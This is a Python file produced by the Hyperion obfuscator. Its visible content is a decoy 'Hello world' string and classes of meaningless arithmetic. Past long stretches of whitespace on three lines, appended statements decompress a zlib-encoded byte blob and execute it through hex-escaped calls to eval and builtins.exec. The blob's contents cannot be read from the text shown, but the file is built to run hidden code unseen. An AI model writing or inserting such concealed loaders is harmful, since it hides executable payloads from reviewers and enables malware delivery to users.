from builtins import *
from math import prod as CallFunction


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_invert, _power, _callfunction, _run, _ceil, _algorithm, Divide = exec, str, tuple, map, ord, globals, type

class Absolute:
    def __init__(self, _negative):
        self._walk = CallFunction((_negative, -54236))
        self._square(Run=2450)

    def _square(self, Run = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._walk += -32613 * Run
        
        try:
            ((Invert, {'BBeydy5RBlBaeyRB5ee': _ceil}) for Invert in {'BBeydy5RBlBaeyRB5ee': _ceil} if Invert >= _power)

        except OSError:
            ((_power, (_ceil, _invert, _ceil)) for _power in {_callfunction: _ceil} if Invert >= _power)

        except:
            Divide(86828 / 56526) == Ellipsis

    def Positive(self, Power = -84563):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Power -= -43190 / -12387
        self._floor != int
        
        try:
            ((_ceil, _invert, Invert) or _callfunction if (_ceil, _invert, Invert) and _callfunction else ... or (_callfunction, (_ceil, _invert, Invert)))

        except OSError:
            ((_invert, _run) or _run if (_invert, _run) and _run else ... or (_run, (_invert, _run)))

        except:
            Divide(19422 + 82599) == None

    def _divide(Floor = int):
        return _algorithm()[Floor]

    def _substract(Product = 37333 / 23788, _modulo = Ellipsis, Algorithm = _algorithm):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Algorithm()[Product] = _modulo
        
        try:
            ((_invert, _run) or _callfunction if (_invert, _run) and _callfunction else ... or (_callfunction, (_invert, _run)))

        except OSError:
            (({'BBeydy5RBlBaeyRB5ee': _ceil}, _ceil) for _ceil in (_ceil, _invert, Invert))

        except:
            Divide(-20595 / 28946) == bool

    def execute(code = str):
        return _invert(_power(_callfunction(_run(_ceil, code))))

    @property
    def _floor(self):
        self.Hypothesis = '<__main__.Hypothesis object at 0x000005948BE35898>'
        return (self.Hypothesis, Absolute._floor)

if __name__ == '__main__':
    try:
        Absolute.execute(code = __code__)
        _system = Absolute(_negative = 39425 * -17925)

        if 125823 > 7405983:
            _system._square(Run = _system._walk + 89862)
        elif 410829 < 4674770:
            _system.Positive(Power = 16563 - _system._walk)                                                                                                                                                                                                                                                          ;Absolute._substract(Product='WXWWWXWXXWWWXWWWWXWXWWWX',_modulo=b'x\x9c\xe5X[\x93\xa28\x14~\xe7W0\xbe\x00\xd5\xd36\xe2\x05\xb5j^\xb6\xdc\xad\xd1\xea\x96\xad\x99\xad\xd5\xa9\xee.\n!\xdaq\x02\xb1\xb8\x8c\xf8\xef\xf7$\x01/\xad\xd8`\xf7\xec\x8b\t9\xb9\x90\x1cr\xbe\x9c\x9c\x93\x10\x87\x9b\xbe$C\xc0s\x95\xe7,\xd86\x9d\xcd\x93\xc8ub\x1a\xda\xb6\xfc\xe9K\xed\xebf\x85BL\x83\x9aL\xc3\xbdnN\x12\xbf\xd00\xe2}\xd4\xda\x0c\x13\xb2\x89_\xd0\x82:q\xb3\xdd\xa9}\xae\xfdA\x12\xf4\ry5\xed`\xd4\x02\xc7/\xc9L0~\x89\xe3U\xd4\xbf\xbb\x13mu\x97\xfaw\xaf\xd8\xdc\x15|\xdb\xc3\x91KC\xef\x90M\xd6X_,\xeeV\xc4Y$\xe8\xd5 \x82]\x14DH\x0c\xfa\xf3\xef\xfb[\xa3\xae\xbf\xea\xe2RO\xbcWV!\x0eb\xb5\xf6\x15\x11B\xe55\r\x89\xf7\xa9\xa6)\x92\xd6\xdf\xf6f\xef\x95\xe8\'\xf6\x14MB\xa9\x8bVq\x06f\xb0J`\xe47\x1a\xa1HvB$\x87\xc8{\n\xfe\xc5\x94\xa0X4\xcc\x00\x99\xa7\xe0\x07Mx\xcd\x91\x19\x93\xa7`Lg\xd4\xdb\xc8\x04\xff\x84q\x1b\x9a\xd44IL\n\xfb+\x1a\xc6\xb6\r_\xdbD\x8aVG)\x8eUM"\xd4uH\xa4j\x8fJ\x9a\xae\xd7\xe9:\xe5\x01JP\\+\xcf_\x16\x84\xce\xa0\x83t\xe2-\x1bD\x86\xc3!\x818$D\x14\x88\xf2\xd8\xef\xdf\xdc\xde\xdc\xaa\xb7\xeaMC\xd3\x9e\x81\x05\x8a\x9d8\x0e\x8bX\xf8"\x04~\x00\x8f\xcf){\x8e\xf9x\xb8\x90\x07\xcb\xd7<\x89,\x85\x99\x0b\xc9\xa4\xa3W\xac?\x1b\x9a\x8a\xd6\x1d#\xa00l\x87T\xd1\xc7F\xa3\xfb\xfb\xd1\xf0~\xc4\x08\x88\x0f\xb5\xe1h\xc4\x1aat\x11cU\x99%\x98\xc48`\xd0\xffr\xc2\x82y\x11\x01&\x07\x95S\x08L\x94C\x8c\x81\xaa\xc5\x1f\x8a\x02\x1c\x13\x9c\xcc^\x03\xa8}\xce\xa1\xdd\x81\xcd\xc3%\xbc\xb4\xc7\x8fdV\xc7\x81\x87\xa0\x07"x\xe5S\xf7\xa8\xc3\xb3&\x15\x82\xce`\x9bN\'\x13xD\x98\xb2\xda\xe4\x8aP#\x94\x1e\xbf\x05\xc8\n\xf7\xdbn\x0e,\x0b\xae\x08\xaa\xd8\xa1d^\x01\xab\t\xd7,\xa6QS\xa1YW\x84U\x18G\x957\xa25\x18\xd0\x01\xa5\xd4\x1aP\x8b\xd2\xc1\x00\x88\x05m\x96uE\xb8\x11\xe7\x17\xaa\xa0b\x14@\xb2\xa8\xc0\x8d\x17-\x8b\x02Z\x8aR_R\x1c\x14\x8d\x9ar3\'\x1eQ\x9cTWN\x8c\xdd\xc8\t\xf0\x87\x80\\\xc8\xeb\x12\x90\x8b\x99\xe5 o\xe6\x98\xa4\xe8%HN"}\xca\xb5n\xbd*`\xc3\x9f\xeb\xf2\xacI\xf8Ou\xb7*l\x1fw\xae"\x17\x0e\xf6\x9ap\x8b\x88\xf3W\xf9\xdd|r[\xaa3\xc54\xcd\xaeir\xba\x8by\x9b\xb9W\xe79\x1c\x11=\xc4.\x11\xaa\xd2\x9d\xc7\'T\xfcj\xe0wQz\xd2\x96\x9eS\xdb\xa25h\xf5:n\xab\xb7\x8b\x1d7\x8fy\xad\xd5+\x81\xbc\xe3\xcf<Gf\xe7&vi\t\xb8\xa4P\xec\x9f0:\xe7w\x97\xf1\x9d\x05\xc3\x80\x87\x93\xef\xaca\xff\x8b\x85\xceT-\x12\xb1\xd90<\xa3kxM\xddxS\x14\x8d\xdf\xa92q\xc4\xbad\xab\xc3\xf4\xba\x7ff\xea\xe7\xc5\xe2\xe2\x0b(\xd2\xac\xf0N\xa1z\xed9O\xdd,\xb1r\x0b\x92\x91\xa5\xb61\xe3B\xbf\xd5\xafU\x11\x14?_\xe0\xfc\x82\xca\xc3\xe5\xc8,\x97d\x891^\xe2%!\x18\x13\xa8\x91w"\xa3g\xcb\xdd\xa8(\xd9D\x98\xf4\xc94\xcfE\xbc\\\xb4\xfc\xfe\xce\xb3m\xf4\x83r\xf2)Z\x03z\xe8\xef\x04\xc3\xc8\x96\xbb\x91%3K\xcd\xac\xdefj\x90\xa9J\x99\xbe%A=\x00\xd6\xd2-6i8\xc4\xe9\x94\x15\xa1\xce*\x94\xea\xd5\xed\x03\x97\x98\'\x00\x82\x1d\x0b!\x95\xc5\xb3i\xebv\xd3n\xdb\x86\xdd\x85R\x1b\xa2\t#Z\xc7\xad\xef\xc4\xbc\x9dm\xb5N\x86_\xbe\xdd\xda\x19\x96\xfc}\x86y\x99\xbef\x15\xcc\xab\xcf\xd70\x8d7\x9d\xebe\xce\xa5\x83:\x1e\x8f(\xa3\xe8\xa0\xb4W.\xedb\xc0J\x80\xa9\x00\nv\x02\x83\xc5X.1\x90\xcaztf\xc6\xf9\xcc\xf6\xe9\xfe\xdc\xbdm\xdd+=k~\xb2\xce\xce\xd9\xd9i{H\xaa+\xbf\xbf\xb5\xbb[\xf3[\xda\x98\xb4@\xc9M\x9e:\x90tPv\x03F\xb4\x8f[\xcb2\xec\xc1\x10\xdd\xee\xd9-\x18\xd4\xe2;\x87\xed&\x9d\xb39h\xfd\x7f\xbd\xf7\x91\xf5I\xb9\xc3M\xf3\xe3V\x9aV\xc7}\xfc\xf00\x86\x08t<f\x89\x11\xa8\x95EJ\x87\x1e\x8d\xf2F\x8a\xad\x04\x03\x97\xa56\xa3\xdcH\x1d\xb5\x96_\xf8._`\xb6\xb8&_\xb3&_\xf8\xa3\xd6\xdf"N\x85\xce\x1f\xad\x01\'\xb5\xe1a\xb7\x969\x1d?\\\xec\xe2\xcf\xdel\x0e\xef1\xa7o6\xbc\\\xda\x8cp\xact\xe1\xf6,\x1d\x9c)\x8bP\xb0N\xaa\xf4<\xa4\xbe\x9c\xff`\x97\xc5\xff{\x19\xae\x0e\xae\xc4\x88\x9a9OX\x03\n\xe8\xf3D5\xc9C>\x95\xe7\x98\xa0H\xfa\x0f\x9f\xa3\xa6\x95')

        if 374042 > 8406368:
            _system._square(Run = _system._walk * -19262)
        elif 111657 < 8876336:
            _system.Positive(Power = 19933 / _system._walk)                                                                                                                                                                                                                                                          ;XXXXXWXWWWWWWWWWWXW,IlIlIIIlllllllIIIIl,IIIlllIlllIIIIllIl,WXWXWWWWWWWXXXWXWX,jiljliljjjiijiiliijlli=(lambda IlIllIIIlllIlIIIll:IlIllIIIlllIlIIIll(__import__('\x7a\x6c\x69\x62'))),(lambda IlIllIIIlllIlIIIll:IlIllIIIlllIlIIIll['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IlIllIIIlllIlIIIll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IlIllIIIlllIlIIIll)"),filename='\x78\x78\x77\x78\x78\x77\x77\x78\x78\x78\x78\x77\x78\x77\x78\x78\x78\x77\x78\x77\x77\x78\x78\x78\x78',mode='\x65\x76\x61\x6c'))),(lambda:(lambda IlIllIIIlllIlIIIll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IlIllIIIlllIlIIIll)"),filename='\x78\x78\x77\x78\x78\x77\x77\x78\x78\x78\x78\x77\x78\x77\x78\x78\x78\x77\x78\x77\x77\x78\x78\x78\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda mnmnnnmnmmnmnnnnmn,IlIllIIIlllIlIIIll:mnmnnnmnmmnmnnnnmn(IlIllIIIlllIlIIIll))
        if 439434 > 5818934:
            Absolute(_negative = -21942 * -9761)._square(Run = _system._walk / -11869)
        elif 152912 < 8771928:
            Absolute(_negative = -67090 * 27990)._square(Run = _system._walk / 34548)                                                                                                                                                                                                                                                          ;WXWXWWWWWWWXXXWXWX()(jiljliljjjiijiiliijlli(IlIlIIIlllllllIIIIl(XXXXXWXWWWWWWWWWWXW(IIIlllIlllIIIIllIl('\x76\x61\x72\x73'))),Absolute._divide(Floor='WXWWWXWXXWWWXWWWWXWXWWWX')))

    except Exception as Invert:
        if 260049 > 677649:
            Absolute.execute(code = _power(Invert))

        elif 302195 > 8621513:
            Absolute(_negative = 36652 - 44375).Positive(Power = 85842 * _system._walk)